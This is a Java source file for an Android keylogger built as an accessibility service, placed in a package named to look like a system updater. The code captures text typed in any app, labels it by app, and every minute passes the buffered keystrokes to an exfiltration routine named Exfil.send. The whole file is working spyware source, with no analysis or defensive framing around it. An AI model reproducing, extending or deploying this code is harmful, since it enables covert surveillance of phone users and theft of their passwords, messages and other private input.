package com.sys.updater;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class KeyloggerService extends AccessibilityService {
    private String currentPackage = "";
    private StringBuilder buffer = new StringBuilder();
    private Timer flushTimer;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        flushTimer = new Timer();
        flushTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                flushBuffer();
            }
        }, 60000, 60000);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
        
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (!pkg.equals(currentPackage) && !pkg.equals("com.android.systemui")) {
                flushBuffer();
                currentPackage = pkg;
                buffer.append("\n\n=== [").append(pkg).append("] ===\n");
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> text = event.getText();
            if (text != null && !text.isEmpty()) {
                buffer.append("> ").append(text.get(0).toString()).append("\n");
            }
        }
    }

    private synchronized void flushBuffer() {
        if (buffer.length() > 0) {
            String data = buffer.toString();
            if (data.length() > 4000) {
                data = data.substring(data.length() - 4000);
            }
            Exfil.send("KEYLOG:\n" + data);
            buffer.setLength(0);
        }
    }

    @Override
    public void onInterrupt() {}
  }
